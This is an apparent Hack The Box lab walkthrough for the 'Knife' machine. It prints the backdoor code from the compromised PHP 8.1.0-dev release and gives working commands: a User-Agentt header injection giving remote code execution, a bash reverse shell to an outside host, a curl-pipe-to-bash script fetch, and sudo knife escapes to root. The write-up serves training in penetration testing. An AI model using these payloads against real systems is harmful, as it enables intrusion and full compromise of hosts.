@@ -1,0 +1,128 @@
+Knife
+
+23th April 2021 / Document No D21.100.128
+Prepared By: MrR3boot
+Machine Creator(s): MrKN16H7
+Difficulty: Easy
+Classification: Official
+Synopsis
+
+Knife is an easy difficulty Linux machine that features an application which is running on a backdoored
+version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration
+is then exploited to gain a root shell.
+
+Skills Required
+
+      Enumeration
+      Basic Knowledge of Linux
+      OWASP Top 10
+
+Skills Learned
+
+      Web Exploitation
+      Knife Sudo Exploitation
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.242 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.242
+
+Nmap scan reveals that the target server has two ports open.
+
+Apache2
+
+Let's browse to port 80.
+
+Apache is hosting an Emergent Medical Idea application. There's nothing interesting in this application.
+
+FFUF
+
+Let's enumerate files and folders using ffuf utility.
+Nothing interesting from the results. We send a cURL request to index.php page and observe the
+response headers.
+
+X-Powered-By header reveals that the application is using PHP/8.1.0-dev version. Searching
+vulnerabilities related to this version reveals that it has a known RCE exploit.
+PHP version 8.1.0-dev was released with a backdoor on March 28th, 2021 where two malicious commits
+were pushed to the php-src-repo , but the backdoor was quickly discovered and removed. Exploit has a
+reference to a git commit which explains the backdoor functionality.
+
+   {
+      zval zoh;
+      php_output_handler *h;
+      zval *enc;
+
+      if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY ||
+   zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+
+          (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]),
+   "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+
+          convert_to_string(enc);
+          if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+
+              zend_try {
+                 zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid
+
+   2017");
+              } zend_end_try();
+
+          }
+      }
+
+      switch (ZLIBG(output_compression)) {
+          case 0:
+
+The code checks for the first occurance of zerodium string in User-Agentt request header. If found, it
+then executes the code after that string.
+
+   zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+
+Let's setup a listener on port 80 and verify this by sending a cURL request to our server.
+
+   curl http://10.10.10.242/index.php -H 'User-Agentt: zerodiumsystem("curl
+   10.10.14.177");'
+After successfully receive the request we fire up a listener on port 1234 and send below request to obtain
+the reverse shell.
+
+   curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
+   &>/dev/tcp/10.10.14.177/1234 0>&1 '\");"
+
+This is indeed successful and a shell as james is received.
+Privilege Escalation
+
+Having foothold on the server, it is possible to enumerate the different ways to escalate privileges. We
+enumerate the server using scripts such as LinEnum.sh or linPEAS.sh. We download the script and copy it to
+the apache web root path. Next, we use curl to transfer and execute the script.
+
+   curl 10.10.14.177/linpeas.sh|bash
+
+Output shows that james is allowed to run knife as root. Knife tool provides an interface to manage Chef
+automation server nodes, cookbooks, recipes and etc. Knife usage can be read from manpage. Some
+examples shows that, it is possible to edit knife data bags using a text editor. We can try that.
+
+   sudo knife data bag create 1 2 -e vi
+This opens up the vim editor. We type below in the editor to get a shell as root.
+
+   :!/bin/sh
+
+This can also be achieved using knife exec sub-command. We can upgrade the shell to a fully interactive.
+   python3 -c 'import pty;pty.spawn("/bin/bash")'
+   ctrl+z
+   stty raw -echo
+   fg
+   reset
+   xterm
+Now it is possible to execute keyboard shortcuts in the shell session. Knife also provides an option exec to
+execute ruby scripts. We issue the following command.
+   sudo knife exec
+This opens up an interactive shell to execute the code. We type the code below and press CTRL D to run it.
+   exec "/bin/bash"
+
+This is successful and a shell as root is obtained. Alternatively the following ways can also be used to obtain
+a root shell.
+
+   sudo knife exec --exec "exec '/bin/sh -i'"
+echo -n 'exec "/bin/bash -i"' > config.rb
+sudo knife user list -c config.rb
+
